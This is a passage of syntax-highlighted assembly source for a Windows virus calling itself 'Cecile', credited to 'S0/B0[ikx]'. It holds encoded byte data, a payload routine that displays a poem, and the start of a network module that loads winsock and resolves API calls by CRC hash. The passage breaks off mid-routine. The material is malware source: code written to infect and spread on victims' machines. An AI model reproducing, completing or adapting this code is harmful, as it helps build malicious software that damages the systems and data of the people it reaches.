 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">087h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ddh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fdh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">07dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0efh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0efh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0efh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">017h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0efh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0deh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eeh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ddh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f2h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0deh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0abh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c7h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">087h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">051h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0deh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0efh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f7h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ddh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0afh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e1h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">018h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">071h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">023h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">017h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f7h</span><span class="sc0">  

</span><span class="sc5">PayCallExit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;include         payload\payload.asm</span><span class="sc0">

</span><span class="sc5">skippayload</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">paytext</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0">              </span><span class="sc12">'To see a world in a grain of sand'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">              </span><span class="sc12">'And heaven in a flower'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">              </span><span class="sc12">'Hold infinite in the palm of your hand'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">              </span><span class="sc12">'And eternity in a hour...'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">              </span><span class="sc12">'                   A kiss to cecile...   '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">paytitle</span><span class="sc4">:</span><span class="sc0">       

</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Cecile coded by S0/B0[ikx], made in assembly'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">PiSyscall0</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">PayloadSyscall</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RoutineHandler</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PayloadEnd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Net module encapsulater</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">CommodStart</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CommodEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CommodStart</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; workable system</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; workable payload version</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">CommodSyscall</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CommodStart</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Commodroutine</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CommodStart</span><span class="sc0">


</span><span class="sc5">CSyscall</span><span class="sc0">        </span><span class="sc9">macro</span><span class="sc0">           </span><span class="sc5">I_ID_CoDE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">I_ID_CoDE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">            </span><span class="sc5">CSyscall0</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">C_apicall</span><span class="sc0">       </span><span class="sc9">macro</span><span class="sc0">           </span><span class="sc5">crcval</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">libhandle</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">libhandle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">crcval</span><span class="sc0">
                </span><span class="sc5">CSyscall</span><span class="sc0">        </span><span class="sc5">MApiCall</span><span class="sc0">

        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">Commodroutine</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">CommodStart</span><span class="sc0">

        </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">wsocklib</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">crt</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
